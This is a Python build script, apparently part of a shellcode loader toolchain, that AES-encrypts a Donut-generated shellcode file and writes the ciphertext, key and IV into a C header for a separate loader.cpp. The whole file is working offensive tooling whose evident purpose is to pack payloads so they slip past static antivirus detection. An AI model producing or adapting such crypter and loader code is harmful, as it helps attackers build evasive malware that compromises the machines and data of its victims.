#!/usr/bin/env python3
"""builder.py — encrypt a Donut shellcode blob and emit payload.h for loader.cpp.

pip install cryptography
"""
import argparse
import os
import sys

from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes


def pad_pkcs7(data: bytes) -> bytes:
    n = 16 - (len(data) % 16)
    return data + bytes([n]) * n


def c_array(name: str, data: bytes, per_line: int = 12) -> str:
    rows = []
    for i in range(0, len(data), per_line):
        chunk = data[i:i + per_line]
        rows.append("    " + ", ".join(f"0x{b:02X}" for b in chunk) + ",")
    return (
        f"static const unsigned char {name}[] = {{\n"
        + "\n".join(rows)
        + "\n};\n"
    )


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("shellcode", help="input shellcode.bin from donut")
    ap.add_argument("header", help="output payload.h")
    args = ap.parse_args()

    raw = open(args.shellcode, "rb").read()
    if len(raw) < 64:
        print("[-] shellcode looks empty", file=sys.stderr)
        return 1

    key = os.urandom(32)
    iv = os.urandom(16)
    enc = Cipher(algorithms.AES(key), modes.CBC(iv)).encryptor()
    blob = enc.update(pad_pkcs7(raw)) + enc.finalize()

    with open(args.header, "w") as f:
        f.write("// generated by builder.py - do not edit\n")
        f.write("#pragma once\n\n")
        f.write(c_array("G_PAYLOAD", blob))
        f.write(c_array("G_KEY", key))
        f.write(c_array("G_IV", iv))
        f.write(f"static const unsigned int G_PAYLOAD_LEN = {len(blob)}u;\n")

    print(f"[builder] {len(raw)} bytes shellcode -> {len(blob)} bytes encrypted")
    print(f"[builder] wrote {args.header}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
